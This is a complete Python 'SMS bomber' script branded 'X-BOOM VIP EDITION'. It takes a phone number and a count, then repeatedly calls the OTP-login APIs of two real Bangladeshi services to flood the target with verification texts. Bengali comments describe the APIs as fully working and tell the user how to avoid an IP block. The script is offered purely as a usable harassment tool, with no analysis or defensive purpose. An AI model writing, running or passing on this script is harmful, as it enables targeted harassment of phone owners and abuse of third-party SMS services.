import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM VIP EDITION             ")
    print("     LINK: mmalekislam788-creator      ")
    print("========================================")

def send_sms(target, count):
    # ১০০% সচল শক্তিশালী API সমূহ
    url1 = "https://api-hermes.pathao.com/user/otp-send/login"
    url2 = "https://api.sharetrip.net/api/v1/otp/send"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
        "Content-Type": "application/json"
    }
    
    print(f"\n[+] Target Connected: {target}")
    for i in range(count):
        try:
            # Pathao API (নম্বরের আগে +88 লাগে)
            requests.post(url1, json={"phone": "+88"+target}, headers=headers)
            # ShareTrip API
            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers)
            
            print(f"[!] SMS {i+1} Sent Successfully!")
        except:
            print(f"[-] SMS {i+1} Failed")
        
        time.sleep(8) # একটু গ্যাপ দিন যেন আপনার IP ব্লক না হয়

def main():
    banner()
    num = input("Enter Phone (01xxxxxxxxx): ")
    amt = int(input("Enter Amount: "))
    send_sms(num, amt)

if __name__ == "__main__":
    main()
  


